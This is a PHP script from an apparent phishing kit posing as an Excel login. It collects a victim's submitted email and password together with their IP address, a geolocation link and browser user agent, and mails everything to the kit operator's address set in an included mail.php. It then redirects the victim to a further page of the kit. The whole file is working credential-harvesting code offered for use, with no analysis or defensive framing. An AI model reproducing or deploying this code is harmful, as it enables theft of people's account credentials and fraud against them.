<?php
$dst= substr(str_shuffle(str_repeat("0123456789", 3)), 0, 3);
if($_POST['pass91m_2'] !=""){

$time = date("D/M/d, Y g:i a"); 
$browser = $_SERVER['HTTP_USER_AGENT'];
$ip = $_SERVER['REMOTE_ADDR'];

require_once('./mail.php');
	
	$message .= "[+]=====================| Access Login |========================[+]\n";
    $message .= "Email : " . $_POST['mailk2m_2'] . "\n"; 
    $message .= "Password : " . $_POST['pass91m_2'] . "\n";  
	$message .= "IP : " .$ip. "\n";
    $message .= "[+]=====================| Geo Ip |========================[+]\n";   
    $message.= "IP Geo 		 : http://www.geoiptool.com/?IP=".$ip."\n";
    $message .= "[+]=====================| User Agent Browser |========================[+]\n";
    $message .= "User Agent : ".$browser."\n";
    $message .= "[+]=====================| $time |========================[+]\n";
	
			$subme ="Incorrect Pass";
		$headers = "From: " . $subme . " <info@anukumu.eue>";
		
	$subject="Excel-v.1 $ip";
	
	mail($mymail, $subject, $message, $headers);
	
?>

<script type="text/javascript"> 
<!-- 
   window.location="./three0a8?id=<?php echo $dst ?>"; 

</script> 

<?PHP

}

?>